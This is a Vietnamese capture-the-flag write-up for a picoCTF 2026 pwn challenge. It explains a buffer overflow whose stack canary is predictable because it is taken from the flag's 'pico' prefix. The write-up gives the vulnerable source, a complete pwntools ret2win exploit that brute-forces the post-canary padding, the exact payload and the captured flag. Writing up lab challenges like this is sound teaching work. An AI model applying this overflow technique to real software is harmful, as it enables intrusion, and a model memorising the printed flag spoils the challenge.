# offset-cycleV2 — picoCTF 2026

> **Category:** Binary Exploitation (Pwn)  
> **Points:** 400  
> **Author:** c10v3

| | |
|---|---|
| **Tên bài** | offset-cycleV2 |
| **Mức độ** | 400 points |
| **Ý tưởng chính** | Buffer overflow có stack canary, nhưng canary được tạo yếu và đoán được |
| **Mục tiêu** | Ghi đè return address để nhảy vào hàm `win()` và in ra flag |
| **Kỹ thuật** | ret2win, suy luận canary, brute-force post-canary padding |

---

## 1. Bối cảnh đề bài

Sau khi SSH vào máy chủ challenge, thư mục làm việc chỉ có ba thứ quan trọng: `CodeBank`, `instructions.txt` và `start`. File `instructions.txt` nói rõ rằng mỗi lần chạy `./start`, hệ thống sẽ sinh ra một file source C và một file binary tương ứng. Người chơi có **80 giây** để khai thác binary vừa sinh ra.

Điểm gây khó chịu: tên file không cố định — có lúc sinh ra `23.c`/`23`, lúc khác là `5.c`/`5`. Vì vậy exploit không thể hardcode tên file, mà phải đọc động sau mỗi lần chạy.

```
ctf-player@pico-chall$ ./start
ctf-player@pico-chall$ ls
23  23.c  CodeBank  instructions.txt  start
```

---

## 2. Phân tích source

Source tiêu biểu được sinh ra:

```c
#define BUFSIZE 303
#define CANARY_SIZE 4
#define FLAGSIZE 64

char global_canary[CANARY_SIZE];

void win() {
    char flag[FLAGSIZE];
    FILE *f = fopen("CodeBank/flag.txt", "r");
    fgets(flag, FLAGSIZE, f);
    puts(flag);
}

void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");
    fread(global_canary, 1, CANARY_SIZE, f);
    fclose(f);
}

void vuln() {
    char local_canary[CANARY_SIZE];
    char buf[BUFSIZE];
    int count;

    memcpy(local_canary, global_canary, CANARY_SIZE);
    read(0, buf, count);  // count do người dùng nhập → overflow!

    if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
        puts("***** Stack Smashing Detected *****");
        exit(0);
    }
}
```

---

## 3. Phân tích lỗ hổng

### 3.1 Overflow không bị giới hạn

`read(0, buf, count)` dùng `count` do người dùng nhập — nếu `count > BUFSIZE` thì buffer overflow.

### 3.2 Canary yếu — đây là chìa khóa

`load_canary()` đọc **4 byte đầu của `flag.txt`** làm canary.

Với picoCTF, flag luôn bắt đầu bằng `picoCTF{...}` → **canary = `b"pico"`** (không cần brute-force!).

> 💡 Hint của đề: *"Guessing the canary is easy"* — đọc source kỹ là hiểu ngay.

### 3.3 Layout stack

```
[ buf (BUFSIZE bytes) ][ local_canary (4 bytes) ][ padding ][ RET ]
```

---

## 4. Xây dựng payload

```python
payload = b"A" * BUFSIZE + b"pico" + b"B" * post_canary_pad + p32(win_addr)
```

Phần duy nhất cần brute-force là `post_canary_pad` — số byte từ sau canary đến return address.

---

## 5. Lấy địa chỉ win()

```bash
ctf-player@pico-chall$ nm 25 | grep " win"
08049316 T win
```

---

## 6. Exploit hoàn chỉnh

```python
#!/usr/bin/env python3
from pwn import *
import os, re, time, stat

context.arch = "i386"
context.log_level = "info"

def snapshot():
    info = {}
    for f in os.listdir("."):
        try:
            st = os.stat(f)
            info[f] = {"mtime": st.st_mtime, "isfile": stat.S_ISREG(st.st_mode), "exec": os.access(f, os.X_OK)}
        except FileNotFoundError:
            pass
    return info

def run_start():
    before = snapshot()
    p = process("./start")
    try:
        p.recvrepeat(0.5)
    except:
        pass
    p.close()
    time.sleep(0.3)
    after = snapshot()
    new_files = [f for f in after if f not in before]
    return after, new_files

def find_pair(after, new_files):
    for f in new_files:
        if re.fullmatch(r"\d+\.c", f):
            stem = f[:-2]
            if stem in after:
                return f, stem
    raise RuntimeError("Không tìm được cặp file mới")

def parse_bufsize(cfile):
    src = open(cfile).read()
    m = re.search(r"#define\s+BUFSIZE\s+(\d+)", src)
    if not m:
        raise RuntimeError("Không tìm thấy BUFSIZE")
    return int(m.group(1))

def exploit(binfile, bufsize):
    elf = ELF(f"./{binfile}", checksec=False)
    win = elf.symbols["win"]
    canary = b"pico"

    for post_canary_pad in range(0, 160):
        p = process(f"./{binfile}")
        try:
            payload = b"A" * bufsize + canary + b"B" * post_canary_pad + p32(win)
            p.recvuntil(b"> ")
            p.sendline(str(len(payload)).encode())
            p.recvuntil(b"Input> ")
            p.send(payload)
            out = p.recvall(timeout=1)
            print(out.decode(errors="ignore"))
            if b"picoCTF{" in out:
                log.success(f"Success with pad = {post_canary_pad}")
                return
        finally:
            p.close()

def main():
    after, new_files = run_start()
    cfile, binfile = find_pair(after, new_files)
    bufsize = parse_bufsize(cfile)
    exploit(binfile, bufsize)

if __name__ == "__main__":
    main()
```

---

## 7. Kết quả

```
[+] Source = 5.c
[+] Binary = 5
[*] win = 0x8049316
[*] bufsize = 958
[*] canary = b'pico'
...
[*] Trying post_canary_pad = 16
Ok... Now Where's the flag?
picoCTF{Y0U_AGa1n_Us3d_pwNt00L5_332a8616}
[+] Success with pad = 16
```

Payload chính xác ở instance này:
```python
b"A" * 958 + b"pico" + b"B" * 16 + p32(0x08049316)
```

---

## 8. Flag

```
picoCTF{Y0U_AGa1n_Us3d_pwNt00L5_332a8616}
```

---

## 9. Bài học rút ra

- **Đừng thấy canary là nghĩ ngay đến brute-force** — phải xem nó được sinh ra như thế nào.
- **Phân biệt rõ 3 offset:** offset tới buffer, offset tới canary, offset từ sau canary tới RET.
- **Đọc hint của đề** — thường là chìa khóa thật sự.
- **Tự động hóa** khi bài sinh file động — script pwntools tiết kiệm rất nhiều thời gian.

---

*Writeup by [c10v3](https://github.com/c10v3) — picoCTF 2026*
